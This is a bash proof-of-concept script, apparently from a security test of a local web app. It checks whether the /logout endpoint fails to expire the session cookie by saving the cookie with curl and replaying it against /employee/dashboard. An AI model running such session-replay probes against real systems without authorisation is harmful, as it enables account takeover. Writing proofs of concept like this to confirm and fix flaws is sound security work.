#!/bin/bash

# POC: Improper Session Cleanup on Logout
# This script demonstrates that the /logout endpoint fails to invalidate the session cookie
# The session cookie remains valid even after logout attempt because:
# 1. The logout handler crashes with a TypeError when role is None
# 2. No Set-Cookie header is sent to expire/invalidate the session
# 3. The session cookie in the client's browser remains valid

TARGET_URL="${1:-http://localhost:5003}"
COOKIE_JAR="/tmp/session_cookies_$$"

echo "[*] POC: Improper Session Cleanup on Logout"
echo "[*] Target: $TARGET_URL"
echo ""

# Step 1: Make initial request to /logout to trigger session
echo "[Step 1] Attempting to access /logout endpoint..."
LOGOUT_RESPONSE=$(curl -s -v -c "$COOKIE_JAR" "$TARGET_URL/logout" 2>&1)
HTTP_CODE=$(echo "$LOGOUT_RESPONSE" | grep "HTTP/" | head -1)
echo "[*] Response: $HTTP_CODE"
echo ""

# Step 2: Check if Set-Cookie header is present in the response
echo "[Step 2] Checking for Set-Cookie header in logout response..."
SET_COOKIE_COUNT=$(echo "$LOGOUT_RESPONSE" | grep -i "set-cookie" | wc -l)
echo "[*] Set-Cookie headers found: $SET_COOKIE_COUNT"

if [ "$SET_COOKIE_COUNT" -eq 0 ]; then
    echo "[!] VULNERABILITY CONFIRMED: No Set-Cookie header sent on logout"
    echo "[!] This means the session cookie was NOT invalidated"
else
    echo "[*] Set-Cookie headers found:"
    echo "$LOGOUT_RESPONSE" | grep -i "set-cookie"
fi
echo ""

# Step 3: Extract and display the session cookie if it exists
echo "[Step 3] Checking saved cookies from logout request..."
if [ -f "$COOKIE_JAR" ]; then
    echo "[*] Saved cookies:"
    cat "$COOKIE_JAR" | grep -v "^#"
    
    # Check if there's a valid session cookie
    SESSION_COOKIE=$(cat "$COOKIE_JAR" | grep -i "session" | grep -v "^#")
    if [ -n "$SESSION_COOKIE" ]; then
        echo "[!] VULNERABILITY CONFIRMED: Session cookie still exists after logout attempt"
    fi
else
    echo "[*] No cookies were saved"
fi
echo ""

# Step 4: Attempt to use the session cookie for a subsequent request
echo "[Step 4] Testing if session cookie is still valid after logout attempt..."
echo "[*] Making request to protected endpoint with logout session cookie..."

# Try accessing a protected endpoint with the cookie
TEST_RESPONSE=$(curl -s -v -b "$COOKIE_JAR" "$TARGET_URL/employee/dashboard" 2>&1 | grep "HTTP/")
echo "[*] Response: $TEST_RESPONSE"

if echo "$TEST_RESPONSE" | grep -q "200\|302"; then
    echo "[!] VULNERABILITY CONFIRMED: Session cookie was accepted after logout!"
    echo "[!] The session was not properly invalidated"
fi
echo ""

# Step 5: Display the error response from logout
echo "[Step 5] Logout endpoint error response details..."
echo "[*] Full response:"
echo "$LOGOUT_RESPONSE" | head -30
echo ""

# Cleanup
rm -f "$COOKIE_JAR"

echo "[*] POC Complete"
echo "[!] VULNERABILITY: Session not invalidated on logout - Set-Cookie header missing"